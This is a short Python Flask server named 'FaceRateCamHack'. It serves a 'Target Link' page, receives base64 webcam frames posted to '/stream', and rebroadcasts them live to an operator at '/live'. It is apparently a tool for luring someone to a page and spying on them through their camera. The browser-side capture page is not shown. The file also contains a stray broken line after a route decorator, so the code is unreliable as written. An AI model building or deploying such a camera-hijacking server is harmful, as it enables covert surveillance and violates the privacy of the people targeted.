from flask import Flask, render_template, request, Response
import base64
import cv2
import numpy as np
import threading
import time

app = Flask(__name__, static_folder='../static', template_folder='../templates')

# Frame terbaru
latest_frame = None
frame_lock = threading.Lock()

@app.route('/target')
def target():
    return render_template('index.html')

@app.route('/stream', methods=['POST'])
'])
def stream():
    global latest_frame
    try:
        data = request.json['image'].split(',')[1]
        img = cv2.imdecode(np.frombuffer(base64.b64decode(data), np.uint8), cv2.IMREAD_COLOR)
        if img is not None:
            img = cv2.resize(img, (320, 240))
            with frame_lock:
                latest_frame = img.copy()
    except: pass
    return {"status": "ok"}

@app.route('/live')
def live():
    def gen():
        while True:
            with frame_lock:
                if latest_frame is not None:
                    _, buf = cv2.imencode('.jpg', latest_frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
                    yield f"data: {base64.b64encode(buf).decode()}\n\n"
            time.sleep(0.1)
    return Response(gen(), mimetype='text/event-stream')

@app.route('/')
def home():
    return "<h2>FaceRateCamHack Active</h2><a href='/target'>Target Link</a> | <a href='/live'>SSE Stream</a>"

if __name__ == '__main__':
    app.run()
